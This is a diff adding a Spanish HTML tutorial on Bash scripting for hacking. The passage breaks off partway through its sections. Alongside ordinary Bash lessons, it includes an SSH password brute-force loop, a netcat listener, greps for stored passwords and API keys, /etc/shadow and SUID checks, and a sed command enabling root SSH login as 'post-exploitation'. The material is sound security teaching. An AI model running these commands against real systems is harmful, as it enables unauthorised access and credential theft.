@@ -1,0 +1,1128 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bash Hacking Notes — Guía interactiva de 0 a avanzado</title>
+    <meta name="description" content="Apuntes de Bash Scripting para Hacking — guía interactiva de 0 a avanzado">
+    <style>
+        :root {
+            --font-mono: 'Courier New', Consolas, 'Liberation Mono', monospace;
+            --font-sans: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            --color-background-primary: #ffffff;
+            --color-background-secondary: #f6f8fa;
+            --color-background-info: #f0f7ff;
+            --color-text-primary: #1f2328;
+            --color-text-secondary: #656d76;
+            --color-text-tertiary: #8b949e;
+            --color-border-secondary: #d0d7de;
+            --color-border-tertiary: #d8dee4;
+            --border-radius-md: 6px;
+            --border-radius-lg: 10px;
+        }
+
+        .sr-only {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            padding: 0;
+            margin: -1px;
+            overflow: hidden;
+            clip: rect(0, 0, 0, 0);
+            white-space: nowrap;
+            border: 0;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0
+        }
+
+        body {
+            font-family: var(--font-mono)
+        }
+
+        .wrap {
+            display: flex;
+            min-height: 600px;
+            border: 0.5px solid var(--color-border-tertiary);
+            border-radius: var(--border-radius-lg);
+            overflow: hidden;
+            background: var(--color-background-primary)
+        }
+
+        .sidebar {
+            width: 220px;
+            min-width: 220px;
+            border-right: 0.5px solid var(--color-border-tertiary);
+            background: var(--color-background-secondary);
+            display: flex;
+            flex-direction: column
+        }
+
+        .sidebar-header {
+            padding: 16px;
+            border-bottom: 0.5px solid var(--color-border-tertiary)
+        }
+
+        .sidebar-header .title {
+            font-size: 13px;
+            font-weight: 500;
+            color: var(--color-text-primary);
+            font-family: var(--font-mono)
+        }
+
+        .sidebar-header .sub {
+            font-size: 11px;
+            color: var(--color-text-tertiary);
+            margin-top: 2px
+        }
+
+        .nav {
+            flex: 1;
+            overflow-y: auto;
+            padding: 8px 0
+        }
+
+        .nav-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 9px 16px;
+            cursor: pointer;
+            border-radius: 0;
+            transition: background 0.15s;
+            border-left: 2px solid transparent;
+            font-size: 12px;
+            color: var(--color-text-secondary);
+            font-family: var(--font-sans)
+        }
+
+        .nav-item:hover {
+            background: var(--color-background-primary);
+            color: var(--color-text-primary)
+        }
+
+        .nav-item.active {
+            background: var(--color-background-primary);
+            color: var(--color-text-primary);
+            border-left: 2px solid #1D9E75;
+            font-weight: 500
+        }
+
+        .nav-item .num {
+            font-size: 10px;
+            color: var(--color-text-tertiary);
+            font-family: var(--font-mono);
+            min-width: 20px
+        }
+
+        .nav-item.active .num {
+            color: #1D9E75
+        }
+
+        .content {
+            flex: 1;
+            overflow-y: auto;
+            padding: 28px 32px
+        }
+
+        .page {
+            display: none
+        }
+
+        .page.active {
+            display: block
+        }
+
+        .page-header {
+            margin-bottom: 24px;
+            padding-bottom: 16px;
+            border-bottom: 0.5px solid var(--color-border-tertiary)
+        }
+
+        .page-title {
+            font-size: 20px;
+            font-weight: 500;
+            color: var(--color-text-primary);
+            font-family: var(--font-sans)
+        }
+
+        .page-desc {
+            font-size: 13px;
+            color: var(--color-text-secondary);
+            margin-top: 6px;
+            font-family: var(--font-sans);
+            line-height: 1.6
+        }
+
+        .badge {
+            display: inline-block;
+            font-size: 10px;
+            padding: 2px 8px;
+            border-radius: 20px;
+            font-family: var(--font-mono);
+            margin-bottom: 8px
+        }
+
+        .badge.green {
+            background: #EAF3DE;
+            color: #27500A
+        }
+
+        .badge.amber {
+            background: #FAEEDA;
+            color: #633806
+        }
+
+        .badge.red {
+            background: #FCEBEB;
+            color: #791F1F
+        }
+
+        .badge.blue {
+            background: #E6F1FB;
+            color: #0C447C
+        }
+
+        .badge.purple {
+            background: #EEEDFE;
+            color: #3C3489
+        }
+
+        .section {
+            margin-bottom: 28px
+        }
+
+        .section-title {
+            font-size: 14px;
+            font-weight: 500;
+            color: var(--color-text-primary);
+            margin-bottom: 12px;
+            font-family: var(--font-sans);
+            display: flex;
+            align-items: center;
+            gap: 8px
+        }
+
+        .section-title::after {
+            content: '';
+            flex: 1;
+            height: 0.5px;
+            background: var(--color-border-tertiary)
+        }
+
+        .codeblock {
+            background: #1a1d23;
+            border-radius: var(--border-radius-md);
+            padding: 16px;
+            margin-bottom: 12px;
+            overflow-x: auto;
+            position: relative
+        }
+
+        .codeblock pre {
+            font-size: 12px;
+            line-height: 1.7;
+            font-family: var(--font-mono);
+            white-space: pre
+        }
+
+        .comment {
+            color: #5a6370
+        }
+
+        .cmd {
+            color: #61afef
+        }
+
+        .str {
+            color: #98c379
+        }
+
+        .var {
+            color: #e5c07b
+        }
+
+        .flag {
+            color: #c678dd
+        }
+
+        .kw {
+            color: #c678dd
+        }
+
+        .func {
+            color: #61afef
+        }
+
+        .ok {
+            color: #98c379
+        }
+
+        .err {
+            color: #e06c75
+        }
+
+        .num {
+            color: #d19a66
+        }
+
+        .label {
+            position: absolute;
+            top: 10px;
+            right: 12px;
+            font-size: 10px;
+            color: #5a6370;
+            font-family: var(--font-mono)
+        }
+
+        .tip {
+            background: var(--color-background-info);
+            border: 0.5px solid var(--color-border-tertiary);
+            border-left: 3px solid #378ADD;
+            border-radius: var(--border-radius-md);
+            padding: 12px 14px;
+            margin-bottom: 12px;
+            font-size: 12px;
+            color: var(--color-text-secondary);
+            font-family: var(--font-sans);
+            line-height: 1.6
+        }
+
+        .tip strong {
+            color: var(--color-text-primary);
+            font-weight: 500
+        }
+
+        .warn {
+            background: #FAEEDA;
+            border-left: 3px solid #BA7517;
+            border-radius: var(--border-radius-md);
+            padding: 12px 14px;
+            margin-bottom: 12px;
+            font-size: 12px;
+            color: #633806;
+            font-family: var(--font-sans);
+            line-height: 1.6
+        }
+
+        .warn strong {
+            color: #412402;
+            font-weight: 500
+        }
+
+        .danger {
+            background: #FCEBEB;
+            border-left: 3px solid #A32D2D;
+            border-radius: var(--border-radius-md);
+            padding: 12px 14px;
+            margin-bottom: 12px;
+            font-size: 12px;
+            color: #791F1F;
+            font-family: var(--font-sans);
+            line-height: 1.6
+        }
+
+        .cols2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px
+        }
+
+        .card {
+            background: var(--color-background-secondary);
+            border: 0.5px solid var(--color-border-tertiary);
+            border-radius: var(--border-radius-md);
+            padding: 14px
+        }
+
+        .card-title {
+            font-size: 12px;
+            font-weight: 500;
+            color: var(--color-text-primary);
+            margin-bottom: 8px;
+            font-family: var(--font-sans)
+        }
+
+        .card p {
+            font-size: 11px;
+            color: var(--color-text-secondary);
+            font-family: var(--font-sans);
+            line-height: 1.6
+        }
+
+        .table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 12px;
+            margin-bottom: 12px
+        }
+
+        .table th {
+            text-align: left;
+            padding: 8px 10px;
+            font-size: 11px;
+            font-weight: 500;
+            color: var(--color-text-secondary);
+            border-bottom: 0.5px solid var(--color-border-tertiary);
+            font-family: var(--font-sans)
+        }
+
+        .table td {
+            padding: 8px 10px;
+            border-bottom: 0.5px solid var(--color-border-tertiary);
+            color: var(--color-text-primary);
+            font-family: var(--font-mono);
+            vertical-align: top
+        }
+
+        .table td.desc {
+            font-family: var(--font-sans);
+            color: var(--color-text-secondary);
+            font-size: 11px
+        }
+
+        .nav-footer {
+            padding: 12px 16px;
+            border-top: 0.5px solid var(--color-border-tertiary);
+            display: flex;
+            gap: 8px
+        }
+
+        .nav-btn {
+            flex: 1;
+            padding: 7px;
+            font-size: 11px;
+            border: 0.5px solid var(--color-border-secondary);
+            border-radius: var(--border-radius-md);
+            background: transparent;
+            color: var(--color-text-secondary);
+            cursor: pointer;
+            font-family: var(--font-sans);
+            transition: all 0.15s
+        }
+
+        .nav-btn:hover {
+            background: var(--color-background-primary);
+            color: var(--color-text-primary)
+        }
+    </style>
+</head>
+
+<body>
+
+    <h2 class="sr-only">Apuntes de Bash Scripting para Hacking — guía interactiva de 0 a avanzado</h2>
+
+    <div class="wrap">
+        <div class="sidebar">
+            <div class="sidebar-header">
+                <div class="title">$ bash --hacking</div>
+                <div class="sub">9 secciones · de 0 a avanzado</div>
+            </div>
+            <nav class="nav" id="nav"></nav>
+            <div class="nav-footer">
+                <button class="nav-btn" id="btn-prev">← Anterior</button>
+                <button class="nav-btn" id="btn-next">Siguiente →</button>
+            </div>
+        </div>
+        <div class="content" id="content"></div>
+    </div>
+
+    <script>
+        const pages = [
+            {
+                id: 'intro', label: 'Introducción', badge: 'green', badgeText: 'básico', desc: '¿Por qué bash para hacking? El shell como arma.', sections: [
+                    {
+                        title: '¿Por qué bash?', html: `
+<div class="cols2">
+<div class="card"><div class="card-title">Disponible en todo objetivo</div><p>Linux corre en el 96% de servidores. Bash siempre está presente, sin instalar nada extra.</p></div>
+<div class="card"><div class="card-title">Sin dependencias</div><p>Scripts portables. Un archivo .sh es suficiente para automatizar reconocimiento, exploits y post-explotación.</p></div>
+<div class="card"><div class="card-title">Integración con herramientas</div><p>Encadena nmap, curl, netcat, wget, ssh y cualquier utilidad del sistema en un solo script.</p></div>
+<div class="card"><div class="card-title">Living off the land</div><p>Usa herramientas ya instaladas en el objetivo para evitar detección (LOLbins).</p></div>
+</div>
+`}, {
+                        title: 'Tu primer script', html: `
+<div class="codeblock"><span class="label">script.sh</span><pre><span class="comment">#!/bin/bash
+# Shebang: le dice al SO qué intérprete usar</span>
+
+<span class="comment"># Hacer el script ejecutable:</span>
+<span class="comment"># chmod +x script.sh  &&  ./script.sh</span>
+
+<span class="cmd">echo</span> <span class="str">"[*] Iniciando reconocimiento..."</span>
+<span class="var">TARGET</span>=<span class="str">"192.168.1.1"</span>
+<span class="cmd">echo</span> <span class="str">"[*] Objetivo: </span><span class="var">$TARGET</span><span class="str">"</span>
+<span class="cmd">ping</span> <span class="flag">-c</span> <span class="num">1</span> <span class="var">$TARGET</span> &gt; /dev/null &amp;&amp; <span class="cmd">echo</span> <span class="str">"[+] Host activo"</span> || <span class="cmd">echo</span> <span class="str">"[-] Host no responde"</span></pre></div>
+<div class="tip"><strong>Convención:</strong> [*] = info, [+] = éxito, [-] = fallo, [!] = alerta. Estándar en scripts de seguridad.</div>
+`}, {
+                        title: 'Ejecutar scripts', html: `
+<table class="table"><thead><tr><th>Método</th><th>Ejemplo</th><th class="desc">Cuándo usarlo</th></tr></thead>
+<tbody>
+<tr><td>./script.sh</td><td>./recon.sh</td><td class="desc">Script en directorio actual con permisos de ejecución</td></tr>
+<tr><td>bash script.sh</td><td>bash recon.sh</td><td class="desc">Sin necesidad de chmod. Útil en targets sin permisos</td></tr>
+<tr><td>source / .</td><td>source vars.sh</td><td class="desc">Ejecuta en el shell actual (mantiene variables)</td></tr>
+<tr><td>bash -x</td><td>bash -x debug.sh</td><td class="desc">Modo debug: muestra cada comando ejecutado</td></tr>
+</tbody></table>
+`}]
+            },
+
+            {
+                id: 'variables', label: 'Variables', badge: 'green', badgeText: 'básico', desc: 'Variables, tipos, arrays y sustitución de comandos.', sections: [
+                    {
+                        title: 'Variables básicas', html: `
+<div class="codeblock"><span class="label">variables.sh</span><pre><span class="comment">#!/bin/bash
+
+# Declaración (sin espacios alrededor del =)</span>
+<span class="var">TARGET</span>=<span class="str">"10.10.10.5"</span>
+<span class="var">PORT</span>=<span class="num">4444</span>
+<span class="var">LHOST</span>=<span class="str">"192.168.1.100"</span>
+
+<span class="comment"># Lectura con $</span>
+<span class="cmd">echo</span> <span class="str">"Atacando </span><span class="var">$TARGET</span><span class="str"> en puerto </span><span class="var">$PORT</span><span class="str">"</span>
+
+<span class="comment"># Variables de solo lectura</span>
+<span class="kw">readonly</span> <span class="var">VERSION</span>=<span class="str">"1.0"</span>
+
+<span class="comment"># Variables de entorno</span>
+<span class="kw">export</span> <span class="var">RHOST</span>=<span class="str">"10.10.10.5"</span>   <span class="comment"># visible en subprocesos</span>
+
+<span class="comment"># Variables especiales</span>
+<span class="cmd">echo</span> <span class="str">"Script: </span><span class="var">$0</span><span class="str">"</span>       <span class="comment"># nombre del script</span>
+<span class="cmd">echo</span> <span class="str">"Args: </span><span class="var">$#</span><span class="str">"</span>         <span class="comment"># número de argumentos</span>
+<span class="cmd">echo</span> <span class="str">"PID: </span><span class="var">$$</span><span class="str">"</span>          <span class="comment"># PID del script</span>
+<span class="cmd">echo</span> <span class="str">"Último exit: </span><span class="var">$?</span><span class="str">"</span>  <span class="comment"># código de salida</span></pre></div>
+`}, {
+                        title: 'Arrays', html: `
+<div class="codeblock"><pre><span class="comment"># Array de puertos comunes</span>
+<span class="var">PORTS</span>=(<span class="num">21</span> <span class="num">22</span> <span class="num">23</span> <span class="num">80</span> <span class="num">443</span> <span class="num">445</span> <span class="num">3306</span> <span class="num">8080</span>)
+
+<span class="cmd">echo</span> <span class="str">"Primer puerto: </span><span class="var">\${PORTS[0]}</span><span class="str">"</span>
+<span class="cmd">echo</span> <span class="str">"Total puertos: </span><span class="var">\${#PORTS[@]}</span><span class="str">"</span>
+<span class="cmd">echo</span> <span class="str">"Todos: </span><span class="var">\${PORTS[@]}</span><span class="str">"</span>
+
+<span class="comment"># Agregar elemento</span>
+<span class="var">PORTS</span>+=(<span class="num">9200</span>)
+
+<span class="comment"># Array de hosts objetivo</span>
+<span class="kw">mapfile</span> <span class="flag">-t</span> <span class="var">HOSTS</span> &lt; targets.txt   <span class="comment"># leer archivo a array</span>
+
+<span class="comment"># Array asociativo (diccionario)</span>
+<span class="kw">declare</span> <span class="flag">-A</span> <span class="var">SERVICES</span>
+<span class="var">SERVICES</span>[<span class="str">"21"</span>]=<span class="str">"FTP"</span>
+<span class="var">SERVICES</span>[<span class="str">"22"</span>]=<span class="str">"SSH"</span>
+<span class="var">SERVICES</span>[<span class="str">"80"</span>]=<span class="str">"HTTP"</span></pre></div>
+`}, {
+                        title: 'Sustitución de comandos', html: `
+<div class="codeblock"><pre><span class="comment"># Capturar output de un comando</span>
+<span class="var">IP</span>=<span class="func">$(</span><span class="cmd">hostname</span> <span class="flag">-I</span> | <span class="cmd">awk</span> <span class="str">'{print $1}'</span><span class="func">)</span>
+<span class="var">OS</span>=<span class="func">$(</span><span class="cmd">uname</span> <span class="flag">-s</span><span class="func">)</span>
+<span class="var">USERS</span>=<span class="func">$(</span><span class="cmd">cat</span> /etc/passwd | <span class="cmd">cut</span> <span class="flag">-d</span>: <span class="flag">-f1</span><span class="func">)</span>
+<span class="var">WHOAMI</span>=<span class="func">$(</span><span class="cmd">id</span> <span class="flag">-u</span><span class="func">)</span>   <span class="comment"># 0 = root</span>
+
+<span class="comment"># Verificar si somos root</span>
+<span class="kw">if</span> [ <span class="str">"</span><span class="var">$WHOAMI</span><span class="str">"</span> <span class="flag">-eq</span> <span class="num">0</span> ]; <span class="kw">then</span>
+<span class="cmd">echo</span> <span class="str">"[+] Ejecutando como root"</span>
+<span class="kw">fi</span>
+
+<span class="comment"># Aritmética</span>
+<span class="var">TOTAL</span>=$(( <span class="num">254</span> - <span class="num">1</span> ))
+<span class="var">RANGO</span>=$(( <span class="var">$PORT</span> + <span class="num">1000</span> ))</pre></div>
+<div class="tip"><strong>$() vs backticks:</strong> Usa siempre $() en vez de &#96;&#96; — es más legible, anidable y no tiene problemas de escape.</div>
+`}]
+            },
+
+            {
+                id: 'control', label: 'Control de flujo', badge: 'green', badgeText: 'básico', desc: 'Condicionales, bucles y lógica de control para scripts de hacking.', sections: [
+                    {
+                        title: 'Condicionales — if/elif/else', html: `
+<div class="codeblock"><pre><span class="comment">#!/bin/bash
+# Verificar si un host responde</span>
+<span class="var">TARGET</span>=<span class="str">"</span><span class="var">$1</span><span class="str">"</span>
+
+<span class="kw">if</span> <span class="cmd">ping</span> <span class="flag">-c</span> <span class="num">1</span> <span class="flag">-W</span> <span class="num">1</span> <span class="var">$TARGET</span> &amp;&gt;/dev/null; <span class="kw">then</span>
+<span class="cmd">echo</span> <span class="str">"[+] </span><span class="var">$TARGET</span><span class="str"> está vivo"</span>
+<span class="kw">elif</span> <span class="cmd">nc</span> <span class="flag">-z</span> <span class="flag">-w1</span> <span class="var">$TARGET</span> <span class="num">80</span> &amp;&gt;/dev/null; <span class="kw">then</span>
+<span class="cmd">echo</span> <span class="str">"[+] </span><span class="var">$TARGET</span><span class="str"> responde en HTTP (sin ICMP)"</span>
+<span class="kw">else</span>
+<span class="cmd">echo</span> <span class="str">"[-] </span><span class="var">$TARGET</span><span class="str"> no responde"</span>
+<span class="kw">fi</span>
+
+<span class="comment"># Comprobaciones de archivos</span>
+<span class="kw">if</span> [ <span class="flag">-f</span> <span class="str">"/etc/shadow"</span> ] &amp;&amp; [ <span class="flag">-r</span> <span class="str">"/etc/shadow"</span> ]; <span class="kw">then</span>
+<span class="cmd">echo</span> <span class="str">"[!] Podemos leer /etc/shadow — ¡privesc!"</span>
+<span class="kw">fi</span></pre></div>
+<table class="table"><thead><tr><th>Flag</th><th class="desc">Comprobación</th></tr></thead>
+<tbody>
+<tr><td>-f</td><td class="desc">Es un archivo regular</td></tr>
+<tr><td>-d</td><td class="desc">Es un directorio</td></tr>
+<tr><td>-r / -w / -x</td><td class="desc">Readable / writable / executable</td></tr>
+<tr><td>-s</td><td class="desc">Archivo no vacío</td></tr>
+<tr><td>-z "$var"</td><td class="desc">Variable vacía</td></tr>
+<tr><td>-n "$var"</td><td class="desc">Variable no vacía</td></tr>
+</tbody></table>
+`}, {
+                        title: 'Bucles para reconocimiento', html: `
+<div class="codeblock"><pre><span class="comment"># for — escanear rango de IPs</span>
+<span class="kw">for</span> <span class="var">i</span> <span class="kw">in</span> {<span class="num">1</span>..<span class="num">254</span>}; <span class="kw">do</span>
+<span class="cmd">ping</span> <span class="flag">-c</span> <span class="num">1</span> <span class="flag">-W</span> <span class="num">1</span> <span class="str">"192.168.1.</span><span class="var">$i</span><span class="str">"</span> &amp;&gt;/dev/null &amp;&amp; \
+<span class="cmd">echo</span> <span class="str">"[+] 192.168.1.</span><span class="var">$i</span><span class="str"> activo"</span> &amp;
+<span class="kw">done</span>
+<span class="cmd">wait</span>   <span class="comment"># esperar todos los procesos background</span>
+
+<span class="comment"># while — leer wordlist para brute force</span>
+<span class="kw">while</span> <span class="kw">read</span> <span class="flag">-r</span> <span class="var">PASSWORD</span>; <span class="kw">do</span>
+<span class="kw">if</span> <span class="cmd">sshpass</span> <span class="flag">-p</span> <span class="str">"</span><span class="var">$PASSWORD</span><span class="str">"</span> <span class="cmd">ssh</span> <span class="flag">-o</span> StrictHostKeyChecking=no \
+admin@<span class="var">$TARGET</span> <span class="str">"id"</span> &amp;&gt;/dev/null; <span class="kw">then</span>
+<span class="cmd">echo</span> <span class="str">"[+] Contraseña encontrada: </span><span class="var">$PASSWORD</span><span class="str">"</span>
+<span class="kw">break</span>
+<span class="kw">fi</span>
+<span class="kw">done</span> &lt; /usr/share/wordlists/rockyou.txt</pre></div>
+<div class="tip"><strong>El &amp; al final</strong> ejecuta el comando en background, permitiendo paralelismo. <code>wait</code> espera a todos antes de continuar.</div>
+`}, {
+                        title: 'case — menú de herramienta', html: `
+<div class="codeblock"><pre><span class="comment">#!/bin/bash
+# Menú de opciones típico en tools de hacking</span>
+
+<span class="kw">case</span> <span class="str">"</span><span class="var">$1</span><span class="str">"</span> <span class="kw">in</span>
+<span class="str">"recon"</span>)
+<span class="cmd">echo</span> <span class="str">"[*] Iniciando reconocimiento en </span><span class="var">$2</span><span class="str">"</span>
+<span class="cmd">nmap</span> <span class="flag">-sC</span> <span class="flag">-sV</span> <span class="flag">-oA</span> recon/<span class="var">$2</span> <span class="var">$2</span>
+;;
+<span class="str">"exploit"</span>)
+<span class="cmd">echo</span> <span class="str">"[*] Lanzando exploit..."</span>
+;;
+<span class="str">"shell"</span>)
+<span class="cmd">echo</span> <span class="str">"[*] Abriendo listener nc..."</span>
+<span class="cmd">nc</span> <span class="flag">-lvnp</span> <span class="num">4444</span>
+;;
+*)
+<span class="cmd">echo</span> <span class="str">"Uso: </span><span class="var">$0</span><span class="str"> [recon|exploit|shell] &lt;target&gt;"</span>
+<span class="kw">exit</span> <span class="num">1</span>
+;;
+<span class="kw">esac</span></pre></div>
+`}]
+            },
+
+            {
+                id: 'funciones', label: 'Funciones', badge: 'amber', badgeText: 'intermedio', desc: 'Modularizar scripts de hacking con funciones reutilizables.', sections: [
+                    {
+                        title: 'Definición y uso', html: `
+<div class="codeblock"><pre><span class="comment">#!/bin/bash
+
+# Función de banner (estilo herramientas reales)</span>
+<span class="func">banner</span>() {
+<span class="cmd">echo</span> <span class="str">"=================================="</span>
+<span class="cmd">echo</span> <span class="str">"  </span><span class="var">$1</span><span class="str"> v1.0 — by </span><span class="var">$2</span><span class="str">"</span>
+<span class="cmd">echo</span> <span class="str">"=================================="</span>
+}
+
+<span class="comment"># Función de logging con colores</span>
+<span class="func">log_ok</span>()   { <span class="cmd">echo</span> <span class="flag">-e</span> <span class="str">"\e[32m[+]\e[0m </span><span class="var">$*</span><span class="str">"</span>; }
+<span class="func">log_err</span>()  { <span class="cmd">echo</span> <span class="flag">-e</span> <span class="str">"\e[31m[-]\e[0m </span><span class="var">$*</span><span class="str">"</span>; }
+<span class="func">log_info</span>() { <span class="cmd">echo</span> <span class="flag">-e</span> <span class="str">"\e[34m[*]\e[0m </span><span class="var">$*</span><span class="str">"</span>; }
+<span class="func">log_warn</span>() { <span class="cmd">echo</span> <span class="flag">-e</span> <span class="str">"\e[33m[!]\e[0m </span><span class="var">$*</span><span class="str">"</span>; }
+
+<span class="comment"># Llamadas</span>
+<span class="func">banner</span> <span class="str">"AutoRecon"</span> <span class="str">"h4x0r"</span>
+<span class="func">log_ok</span>  <span class="str">"Host activo"</span>
+<span class="func">log_err</span> <span class="str">"Puerto cerrado"</span></pre></div>
+`}, {
+                        title: 'Funciones con return values', html: `
+<div class="codeblock"><pre><span class="comment"># Las funciones retornan 0 (ok) o 1-255 (error)
+# Para devolver datos, usar echo + sustitución</span>
+
+<span class="func">is_alive</span>() {
+<span class="cmd">ping</span> <span class="flag">-c</span> <span class="num">1</span> <span class="flag">-W</span> <span class="num">1</span> <span class="str">"</span><span class="var">$1</span><span class="str">"</span> &amp;&gt;/dev/null
+<span class="kw">return</span> <span class="var">$?</span>   <span class="comment"># 0 = vivo, 1 = muerto</span>
+}
+
+<span class="func">get_os</span>() {
+<span class="kw">local</span> <span class="var">ttl</span>
+<span class="var">ttl</span>=<span class="func">$(</span><span class="cmd">ping</span> <span class="flag">-c1</span> <span class="var">$1</span> 2&gt;/dev/null | <span class="cmd">grep</span> ttl | <span class="cmd">grep</span> <span class="flag">-oP</span> <span class="str">'ttl=\K\d+'</span><span class="func">)</span>
+<span class="kw">if</span>   [ <span class="str">"</span><span class="var">$ttl</span><span class="str">"</span> <span class="flag">-le</span> <span class="num">64</span>  ] 2&gt;/dev/null; <span class="kw">then</span> <span class="cmd">echo</span> <span class="str">"Linux"</span>
+<span class="kw">elif</span> [ <span class="str">"</span><span class="var">$ttl</span><span class="str">"</span> <span class="flag">-le</span> <span class="num">128</span> ] 2&gt;/dev/null; <span class="kw">then</span> <span class="cmd">echo</span> <span class="str">"Windows"</span>
+<span class="kw">else</span> <span class="cmd">echo</span> <span class="str">"Desconocido"</span>
+<span class="kw">fi</span>
+}
+
+<span class="comment"># Uso</span>
+<span class="kw">if</span> <span class="func">is_alive</span> <span class="str">"10.10.10.5"</span>; <span class="kw">then</span>
+<span class="var">OS</span>=<span class="func">$(</span><span class="func">get_os</span> <span class="str">"10.10.10.5"</span><span class="func">)</span>
+<span class="func">log_ok</span> <span class="str">"Vivo — OS probable: </span><span class="var">$OS</span><span class="str">"</span>
+<span class="kw">fi</span></pre></div>
+<div class="tip"><strong>local</strong>: Declara variables locales dentro de funciones para evitar contaminar el scope global. Siempre úsalo en funciones.</div>
+`}, {
+                        title: 'Manejo de argumentos', html: `
+<div class="codeblock"><pre><span class="comment">#!/bin/bash
+# Script profesional con argumentos y ayuda</span>
+
+<span class="func">usage</span>() {
+<span class="cmd">echo</span> <span class="str">"Uso: </span><span class="var">$0</span><span class="str"> -t &lt;target&gt; -p &lt;ports&gt; [-o &lt;output&gt;]"</span>
+<span class="cmd">echo</span> <span class="str">"  -t  IP o rango objetivo"</span>
+<span class="cmd">echo</span> <span class="str">"  -p  Puertos (22,80 o 1-1000)"</span>
+<span class="cmd">echo</span> <span class="str">"  -o  Archivo de salida"</span>
+<span class="kw">exit</span> <span class="num">1</span>
+}
+
+<span class="kw">while</span> <span class="func">getopts</span> <span class="str">"t:p:o:h"</span> <span class="var">opt</span>; <span class="kw">do</span>
+<span class="kw">case</span> <span class="var">$opt</span> <span class="kw">in</span>
+t) <span class="var">TARGET</span>=<span class="str">"</span><span class="var">$OPTARG</span><span class="str">"</span> ;;
+p) <span class="var">PORTS</span>=<span class="str">"</span><span class="var">$OPTARG</span><span class="str">"</span>  ;;
+o) <span class="var">OUTPUT</span>=<span class="str">"</span><span class="var">$OPTARG</span><span class="str">"</span> ;;
+h) <span class="func">usage</span>            ;;
+*) <span class="func">usage</span>            ;;
+<span class="kw">esac</span>
+<span class="kw">done</span>
+
+[ <span class="flag">-z</span> <span class="str">"</span><span class="var">$TARGET</span><span class="str">"</span> ] &amp;&amp; <span class="func">usage</span></pre></div>
+`}]
+            },
+
+            {
+                id: 'texto', label: 'Texto y filtrado', badge: 'amber', badgeText: 'intermedio', desc: 'grep, sed, awk, cut — procesar output de herramientas de hacking.', sections: [
+                    {
+                        title: 'grep — filtrar resultados', html: `
+<div class="codeblock"><pre><span class="comment"># Básico: buscar en output de nmap</span>
+<span class="cmd">nmap</span> <span class="flag">-sV</span> <span class="var">$TARGET</span> | <span class="cmd">grep</span> <span class="str">"open"</span>
+
+<span class="comment"># -i ignora mayúsculas, -v invierte, -E usa regex extendido</span>
+<span class="cmd">cat</span> access.log | <span class="cmd">grep</span> <span class="flag">-E</span> <span class="str">"(admin|login|passwd)"</span>
+<span class="cmd">cat</span> /etc/passwd | <span class="cmd">grep</span> <span class="flag">-v</span> <span class="str">"nologin"</span> | <span class="cmd">grep</span> <span class="flag">-v</span> <span class="str">"false"</span>
+
+<span class="comment"># -oP extrae solo el match con Perl regex (muy útil)</span>
+<span class="cmd">cat</span> output.txt | <span class="cmd">grep</span> <span class="flag">-oP</span> <span class="str">'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b'</span>
+<span class="comment"># Extrae todas las IPs de un archivo</span>
+
+<span class="comment"># Buscar credenciales en archivos de config</span>
+<span class="cmd">grep</span> <span class="flag">-rn</span> <span class="flag">-i</span> <span class="str">"password\|passwd\|secret\|api_key"</span> /var/www/ 2&gt;/dev/null
+
+<span class="comment"># Buscar ficheros SUID</span>
+<span class="cmd">find</span> / <span class="flag">-perm</span> <span class="flag">-4000</span> <span class="num">2</span>&gt;/dev/null | <span class="cmd">grep</span> <span class="flag">-v</span> snap</pre></div>
+`}, {
+                        title: 'sed — modificar texto', html: `
+<div class="codeblock"><pre><span class="comment"># Sintaxis: sed 's/buscar/reemplazar/flags'</span>
+
+<span class="comment"># Limpiar output de nmap para parsear</span>
+<span class="cmd">nmap</span> <span class="flag">-oG</span> - <span class="var">$TARGET</span> | <span class="cmd">sed</span> <span class="str">'s/Host: //; s/Ports: //'</span>
+
+<span class="comment"># Extraer solo puertos abiertos de grepable output</span>
+<span class="cmd">cat</span> scan.gnmap | <span class="cmd">grep</span> <span class="str">"open"</span> | \
+<span class="cmd">sed</span> <span class="str">'s/.*Ports: //; s/\/open.*//g'</span>
+
+<span class="comment"># Modificar archivo de configuración en post-explotación</span>
+<span class="cmd">sed</span> <span class="flag">-i</span> <span class="str">'s/PermitRootLogin no/PermitRootLogin yes/'</span> /etc/ssh/sshd_config
+
+<span class="comment"># Eliminar líneas con comentarios y vacías</span>
+<span class="cmd">sed</span> <span class="str">'/^#/d; /^$/d'</span> config.txt
+
+<span class="comment"># Insertar línea al inicio del archivo</span>
+<span class="cmd">sed</span> <span class="flag">-i</span> <span class="str">'1i root:toor'</span> /tmp/hashes.txt</pre></div>
+`}, {
+                        title: 'awk — extraer columnas', html: `
+<div class="codeblock"><pre><span class="comment"># awk: procesa texto columna por columna</span>
+
+<span class="comment"># Extraer IPs y puertos del output de nmap</span>
+<span class="cmd">nmap</span> <span class="flag">-oG</span> - <span class="num">192.168.1.0</span>/24 | <span class="cmd">awk</span> <span class="str">'/open/ {print $2}'</span>
+
+<span class="comment"># Extraer usuarios de /etc/passwd</span>
+<span class="cmd">cat</span> /etc/passwd | <span class="cmd">awk</span> <span class="flag">-F</span>: <span class="str">'{print $1, $3, $6}'</span>
+<span class="comment"># campo 1=usuario, 3=UID, 6=home</span>
+
+<span class="comment"># Filtrar usuarios con UID >= 1000 (usuarios reales)</span>
+<span class="cmd">awk</span> <span class="flag">-F</span>: <span class="str">'$3 >= 1000 {print $1":"$6}'</span> /etc/passwd
+
+<span class="comment"># Parsear log de apache para IPs únicas</span>
+<span class="cmd">awk</span> <span class="str">'{print $1}'</span> /var/log/apache2/access.log | <span class="cmd">sort</span> <span class="flag">-u</span>
+
+<span class="comment"># Sumar bytes transferidos por IP</span>
+<span class="cmd">awk</span> <span class="str">'{bytes[$1]+=$10} END{for(ip in bytes) print ip, bytes[ip]}'</span> access.log</pre></div>
+<div class="tip"><strong>Tip:</strong> La combinación <code>nmap | grep | awk | sort -u</code> es el pipeline más usado en reconocimiento para extraer hosts únicos activos.</div>
+`}]
+            },
+
+            {
